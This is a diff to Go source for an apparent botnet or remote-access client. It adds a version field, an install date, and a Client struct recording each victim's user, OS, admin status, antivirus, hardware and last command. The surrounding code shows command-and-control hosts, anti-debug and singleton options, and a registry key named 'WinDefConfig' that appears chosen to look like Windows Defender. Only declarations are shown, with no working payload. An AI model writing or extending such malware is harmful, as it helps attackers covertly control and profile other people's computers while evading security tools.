@@ -47,9 +47,10 @@ var (
 	}
 	g_seed = rand.New(rand.NewSource(time.Now().UTC().UnixNano()))
 
-	g_guid    = ""
-	g_token   = ""
-	g_regpath = "Software/WinDefConfig"
+	g_guid        = ""
+	g_token       = ""
+	g_regpath     = "Software/WinDefConfig"
+	g_installdate = ""
 
 	// Dlls loading
 	user32   = syscall.NewLazyDLL("user32.dll")
@@ -72,6 +73,7 @@ var (
 	pfnGetCurrentProcess   = kernel32.NewProc("GetCurrentProcess")
 
 	botcore = BotCore{
+		version:      "1.0.0",
 		hosts:        []string{"127.0.0.1:8080"},
 		singleton:    true,
 		anti_debug:   false,
@@ -104,6 +106,7 @@ const (
 )
 
 type BotCore struct {
+	version      string
 	hosts        []string
 	singleton    bool
 	anti_debug   bool
@@ -128,4 +131,21 @@ type ServerReply struct {
 	Args    map[string]any    `json:"args"`
 	Error   string            `json:"error"`
 	Headers map[string]string `json:"-"`
+}
+
+type Client struct {
+	Id          int    `json:"id"`
+	Guid        string `json:"guid"`
+	Token       string `json:"token"`
+	Ip          string `json:"ip"`
+	Whoami      string `json:"whoami"`
+	Os          string `json:"os"`
+	Installdate string `json:"installdate"`
+	Isadmin     string `json:"isadmin"`
+	Antivirus   string `json:"antivirus"`
+	Cpuinfo     string `json:"cpuinfo"`
+	Gpuinfo     string `json:"gpuinfo"`
+	Version     string `json:"version"`
+	Lastseen    string `json:"lastseen"`
+	Lastcommand string `json:"lastcommand"`
 }
